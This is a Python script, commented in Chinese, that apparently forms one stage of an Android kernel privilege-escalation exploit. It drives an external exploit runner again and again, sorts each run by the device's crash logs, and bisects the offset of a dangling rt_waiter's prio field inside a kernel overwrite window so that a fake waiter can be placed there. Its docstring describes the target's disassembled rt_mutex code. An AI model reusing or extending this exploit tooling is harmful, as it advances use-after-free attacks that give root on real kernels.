# -*- coding: utf-8 -*-
"""bisect3.py — 钉住悬空 rt_waiter 的 prio 字在覆盖窗口里的下标。

bisect2 作废的两个理由(都独立致命):
  (1) 分支写反: run() 返回"存活"; 存活 ⇒ prio 不在探针区 ⇒ 该 lo=mid, 代码做了 hi=mid。
  (2) 判据不干净: "程序在 punch 之前就自己退了(没拿到 EDEADLK / slide 不对)"被当成"炸"。
      ⇒ 之前那 5 次"全区/半区都炸"根本没有一次证明过幽灵被读到。

现在的链走第一触点(设备反汇编 rt_mutex_adjust_pi@0xffffffc010377ac0 逐条坐实):
      ldr x8,[task,#0x940]      ; waiter = p->pi_blocked_on   ← 幽灵
      ldr w9,[task,#0xb4]       ; p->prio
      ldr w10,[waiter,#0x40]    ; waiter->prio   ← 唯一被读的幽灵字段
      cmp w10,w9 / b.ne 继续走 / tbz w9,#0x1f 非 dl ⇒ 直接出
而 __sched_setscheduler 在调到它之前只读 p->pi_top_task(0x938), **不碰 pi_blocked_on**
      (0x10331ab0: ldr x8,[x19,#0x938]; ldr w8,[x8,#0xb4]) ⇒ 判据是干净的单比特。

基础值(=让 [3] 命中的那个数)不能手算: punch 之后 p->prio = min(139, O->prio),
O 阻塞在 W 持有的 C 上 ⇒ O 是 W 的 pi_top_task。所以先**标定**再二分:
  候选 1 = 实测的打 punch 前的 p->prio(O nice=0 ⇒ 通常就等于它)
  候选 2 = 候选 1 + 19(nice 0→19 未被提升的情形)
分类器只认设备端 fsync 日志的三个哨兵: [DONE]=存活全程 / 有 punch 无 DONE=死在链走 /
连 punch 都没到=无效运行(绝不当成证据)。

用法: python cm57/bisect3.py
"""
import io, os, re, subprocess, sys, time

BASE = r'G:\项目\Windows管理\usb\临时root'
WORDS = 0x200 // 8

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass


def one(args, tries=2):
    """跑一轮 ⇒ (分类 survive|crash|invalid, 设备日志)。invalid 自动重跑。"""
    log, k = '', 'invalid'
    for t in range(tries):
        p = subprocess.run([sys.executable, os.path.join(BASE, 'cm57', 'auto.py'), args],
                           capture_output=True, text=True, encoding='utf-8',
                           errors='replace', timeout=1800)
        out = (p.stdout or '') + (p.stderr or '')
        lg = re.search(r'--- 等设备回来.*', out, re.S)
        log = lg.group(0) if lg else out
        if '[DONE] 全流程结束' in log:
            k = 'survive'
        elif 'punch 已返回' in log:
            k = 'crash'          # 打出去了但没活到结束 ⇒ 死在链走之后
        elif '载荷已放置' in log:
            k = 'crash'          # ★ sched_setattr 进去了没回来 = 死在链走里(这就是我们要的比特)
        else:
            k = 'invalid'
        if k != 'invalid':
            break
        print('    (无效运行: 没跑到 punch ⇒ 重跑)', flush=True)
        time.sleep(3)
    m = re.search(r'选定 slide=([0-9a-f]+)', out) or re.search(r'slide=0', out)
    key = [l.strip() for l in log.splitlines()
           if re.search(r'\[P\]|\[R\]|\[W\]|DONE|\[-\]|\[\+\]|punch', l)]
    tail = (key or [l.strip() for l in log.splitlines() if l.strip()])[-4:]
    print('  %-24s [%-7s] %s' % (args, k, ' || '.join(tail)[:260]), flush=True)
    return k, log


def measured_prio(log):
    m = re.search(r'实测 prio=(\d+)', log)
    return int(m.group(1)) if m else None


def main():
    print('步骤 A 标定基础值: 全区填候选值(不下毒) ⇒ 必须存活', flush=True)
    k, log = one('probe 0 0')
    base = measured_prio(log)
    if k == 'invalid' or base is None:
        print('!! 连 punch 都没跑到(幽灵没成形?), 停。')
        return
    if k == 'crash':
        print('   候选 1(%d) 不行 ⇒ 试候选 2 = %d+19' % (base, base), flush=True)
        b2 = base + 19
        k, log = one('probe 0 0 %d %d' % (b2, b2 - 1))
        if k != 'survive':
            print('!! 两个候选都炸 ⇒ 链走的第一触点不是 waiter->prio, 模型错了。停。')
            return
        base = b2
    print('   ⇒ 基础值 = %d(真 p->prio), 判据可用' % base, flush=True)

    print('步骤 B 全区下毒 ⇒ 必须炸(这才算"幽灵被链走读到 + 覆盖层够得到")', flush=True)
    k, log = one('probe 0 %d %d %d' % (WORDS, base, base - 1))
    if k != 'crash':
        print('!! 全区下毒%s ⇒ 覆盖窗口里没有 prio 字(深度模型错)。停。' %
              ('存活' if k == 'survive' else '无效'))
        return
    print('   ⇒ 幽灵存在性成立, prio 字 ∈ [0,%d)' % WORDS, flush=True)

    # 先直接验静态模型自己的预测(prio = 窗口字 25), 命中就只用 2 轮收工, 省掉整棵二分树。
    print('步骤 M: 只毒模型预测的 prio 字邻域 [24,26) ⇒ 炸就说明模型只差 ≤1 字', flush=True)
    k, log = one('probe 24 2 %d %d' % (base, base - 1))
    if k == 'crash':
        lo, hi = 24, 26
    elif k == 'survive':
        print('   模型偏了 >1 字 ⇒ 回到全窗口二分', flush=True)
        lo, hi = 0, WORDS
    else:
        print('!! 无效运行, 停。')
        return

    n = 0
    while hi - lo > 1:
        mid = (lo + hi) // 2
        n += 1
        print('步骤 C%d: 下毒 [%d,%d) 收窄 [%d,%d)' % (n, lo, mid, lo, hi), flush=True)
        k, log = one('probe %d %d %d %d' % (lo, mid - lo, base, base - 1))
        if k == 'invalid':
            print('!! 无效运行收尾, 不猜。')
            return
        if k == 'survive':      # prio 不在左半边 ⇒ 去右半边
            lo = mid
        else:                   # 炸 ⇒ prio 在左半边
            hi = mid
        time.sleep(2)
    print('===> prio 字下标 = %d (窗口字节 0x%x)' % (lo, lo * 8), flush=True)
    print('     ⇒ 假 waiter 起点 = 窗口字 %d (字节 0x%x)' % (lo - 8, lo * 8 - 0x40), flush=True)
    print('     ⇒ 静态模型给的是 prio=字 25 / waiter 起字 17 ⇒ 差 %+d 字' % (lo - 25), flush=True)


main()
